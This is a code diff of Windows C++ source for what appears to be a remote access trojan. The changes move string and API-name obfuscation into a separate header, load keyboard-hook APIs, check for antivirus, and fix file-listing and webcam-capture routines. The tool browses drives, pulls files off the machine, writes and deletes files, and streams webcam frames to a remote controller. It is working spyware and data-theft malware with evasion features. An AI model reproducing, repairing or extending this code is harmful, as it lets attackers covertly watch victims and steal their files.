@@ -25,25 +25,11 @@
 #define sprintf(buf, fmt, ...) snprintf(buf, 4096, fmt, ##__VA_ARGS__)
 #endif
 
-// Simple String Obfuscation (Runtime XOR)
-// We use a simple function instead of complex templates to avoid build errors on MinGW
-char* DecryptStr(const char* s, int len, int key) {
-    static char buf[256];
-    for(int i=0; i<len && i<255; i++) {
-        buf[i] = s[i] ^ (key + i % 3);
-    }
-    buf[len] = 0;
-    return buf;
-}
-
-// Hardcoded encrypted strings (Key: 0x55)
-// "kernel32.dll" -> "\x3e\x30\x27\x3b\x30\x39\x66\x67\x7b\x39\x39" (Example logic)
-// For stability, we will stick to API Hiding for now.
-
 #define MINIAUDIO_IMPLEMENTATION
 #define MA_NO_DECODING
 #define MA_NO_ENCODING
 #include "miniaudio.h"
+#include "obfuscation.h"
 #include "api_loader.h"
 #include "core.h"
 #include "core.cpp"
@@ -88,21 +74,11 @@ pUnhookWindowsHookEx fnUnhookWindowsHookEx = NULL;
 pCallNextHookEx fnCallNextHookEx = NULL;
 
 void LoadCriticalAPIs() {
-    // "user32.dll"
-    char u32[] = {'u','s','e','r','3','2','.','d','l','l',0};
-    HMODULE hUser32 = LoadLibraryA(u32);
+    HMODULE hUser32 = LoadLibraryA("user32.dll");
     if (hUser32) {
-        // "SetWindowsHookExA"
-        char swh[] = {'S','e','t','W','i','n','d','o','w','s','H','o','o','k','E','x','A',0};
-        fnSetWindowsHookExA = (pSetWindowsHookExA)GetProcAddress(hUser32, swh);
-        
-        // "UnhookWindowsHookEx"
-        char uhw[] = {'U','n','h','o','o','k','W','i','n','d','o','w','s','H','o','o','k','E','x',0};
-        fnUnhookWindowsHookEx = (pUnhookWindowsHookEx)GetProcAddress(hUser32, uhw);
-        
-        // "CallNextHookEx"
-        char cnh[] = {'C','a','l','l','N','e','x','t','H','o','o','k','E','x',0};
-        fnCallNextHookEx = (pCallNextHookEx)GetProcAddress(hUser32, cnh);
+        fnSetWindowsHookExA = (pSetWindowsHookExA)GetProcAddress(hUser32, "SetWindowsHookExA");
+        fnUnhookWindowsHookEx = (pUnhookWindowsHookEx)GetProcAddress(hUser32, "UnhookWindowsHookEx");
+        fnCallNextHookEx = (pCallNextHookEx)GetProcAddress(hUser32, "CallNextHookEx");
     }
 }
 
@@ -198,7 +174,7 @@ string GetAntivirus() {
 
 // --- Features ---
 void ListDrives() { DWORD d = GetLogicalDrives(); string j = "["; bool first = true; for (int i = 0; i < 26; i++) { if (d & (1 << i)) { if (!first) j.append(","); first = false; char drv[10]; snprintf(drv, sizeof(drv), "%c:\\", (char)('A' + i)); j.append("{\"name\":\""); j.append(drv); j.append("\",\"is_dir\":true,\"size\":0}"); } } j.append("]"); SendPacket(TYPE_FILE_LS_RES, j.c_str(), (int)j.length()); }
-void ListDirectory(const char* pUtf8) { if (strlen(pUtf8) == 0 || strcmp(pUtf8, "root") == 0) { ListDrives(); return; } wstring pathW = Utf8ToWide(pUtf8); if (pathW.length() > 0 && pathW.back() == (wchar_t)BS) pathW.pop_back(); wstring search = pathW; search.append(L"\\*"); WIN32_FIND_DATAW ffd; HANDLE hFind = FindFirstFileW(search.c_str(), &ffd); if (hFind == INVALID_HANDLE_VALUE) { SendPacket(TYPE_FILE_LS_RES, "[]", 2); return; } string json = "["; bool first = true; do { if (wcscmp(ffd.cFileName, L".") == 0 || wcscmp(ffd.cFileName, L"..") == 0) continue; if (!first) json.append(","); first = false; string name = EscapeJson(WideToUtf8(ffd.cFileName)); bool isDir = (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0; long long sz = ((long long)ffd.nFileSizeHigh << 32) | ffd.nFileSizeLow; json.append("{\"name\":\""); json.append(name); json.append("\",\"is_dir\":"); json.append(isDir ? "true" : "false"); json.append(",\"size\":"); json.append(to_string(sz)); json.append("}"); } while (FindNextFileW(hFind, &ffd) != 0); json.append("]"); FindClose(hFind); SendPacket(TYPE_FILE_LS_RES, json.c_str(), (int)json.length()); }
+void ListDirectory(const char* pUtf8) { if (strlen(pUtf8) == 0 || strcmp(pUtf8, "root") == 0) { ListDrives(); return; } wstring pathW = Utf8ToWide(pUtf8); if (pathW.length() > 0 && pathW.back() == (wchar_t)BS) pathW.pop_back(); wstring search = pathW; search.append(L"\\*"); WIN32_FIND_DATAW ffd; HANDLE hFind = FindFirstFileW(search.c_str(), &ffd); if (hFind == INVALID_HANDLE_VALUE) { SendPacket(TYPE_FILE_LS_RES, "[]", 2); return; } string json = "["; bool first = true; do { if (wcscmp(ffd.cFileName, L".") == 0 || wcscmp(ffd.cFileName, L"..") == 0) continue; if (!first) json.append(","); first = false; string name = EscapeJson(WideToUtf8(ffd.cFileName)); bool isDir = (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0; long long sz = ((long long)ffd.nFileSizeHigh << 32) | ffd.nFileSizeLow; json.append("{\"name\":"); json.append(name); json.append(",\"is_dir\":"); json.append(isDir ? "true" : "false"); json.append(",\"size\":"); json.append(to_string(sz)); json.append("}"); } while (FindNextFileW(hFind, &ffd) != 0); json.append("]"); FindClose(hFind); SendPacket(TYPE_FILE_LS_RES, json.c_str(), (int)json.length()); }
 void DownloadFile(const char* p) { wstring w = Utf8ToWide(p); HANDLE h = CreateFileW(w.c_str(), GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0); if (h != INVALID_HANDLE_VALUE) { DWORD s = GetFileSize(h, 0); if (s > 0) { char* b = (char*)malloc(s); DWORD r; if (ReadFile(h, b, s, &r, 0)) SendPacket(TYPE_FILE_DOWN_RES, b, s); free(b); } CloseHandle(h); } } 
 void WriteLocalFile(const char* d, int l) { int pl = (int)strlen(d); if (pl >= l) return; string p(d); wstring w = Utf8ToWide(p); const char* c = d + pl + 1; int cl = l - pl - 1; HANDLE h = CreateFileW(w.c_str(), GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0); if (h != INVALID_HANDLE_VALUE) { DWORD r; WriteFile(h, c, cl, &r, 0); CloseHandle(h); } } 
 void DeleteFileOrDir(const char* p) { wstring w = Utf8ToWide(p); if (!DeleteFileW(w.c_str())) RemoveDirectoryW(w.c_str()); } 
@@ -239,7 +215,7 @@ DWORD WINAPI CamThread(LPVOID p) {
         while(bCamRunning) {
             long sz = 0; if(pS->GetCurrentBuffer(&sz, NULL) == S_OK && sz > 0) {
                 char* b = (char*)malloc(sz); pS->GetCurrentBuffer(&sz, (long*)b); AM_MEDIA_TYPE mt2; pS->GetConnectedMediaType(&mt2); VIDEOINFOHEADER* vih = (VIDEOINFOHEADER*)mt2.pbFormat;
-                IStream* ps = NULL; CreateStreamOnHGlobal(NULL, TRUE, &ps); Bitmap* bmp = new Bitmap(vih->bmiHeader.biWidth, vih->bmiHeader.biWidth * 3, PixelFormat24bppRGB, (BYTE*)b);
+                IStream* ps = NULL; CreateStreamOnHGlobal(NULL, TRUE, &ps); Bitmap* bmp = new Bitmap(vih->bmiHeader.biWidth, vih->bmiHeader.biHeight, vih->bmiHeader.biWidth * 3, PixelFormat24bppRGB, (BYTE*)b);
                 bmp->RotateFlip(RotateNoneFlipY); CLSID c; GetEncoderClsid(L"image/jpeg", &c); EncoderParameters ep; ep.Count = 1; ep.Parameter[0].Guid = EncoderQuality; ep.Parameter[0].Type = EncoderParameterValueTypeLong; ep.Parameter[0].NumberOfValues = 1; ULONG q = (ULONG)camQuality; ep.Parameter[0].Value = &q; 
                 bmp->Save(ps, &c, &ep); LARGE_INTEGER lz = { 0 }; ULARGE_INTEGER pos; ps->Seek(lz, STREAM_SEEK_END, &pos); ps->Seek(lz, STREAM_SEEK_SET, NULL); DWORD jsz = (DWORD)pos.QuadPart; char* jb = (char*)malloc(jsz); ULONG br; ps->Read(jb, jsz, &br); SendPacket(TYPE_CAM_FRAME, jb, jsz); free(jb); free(b); delete bmp; ps->Release();
             } Sleep(1000/camFPS);
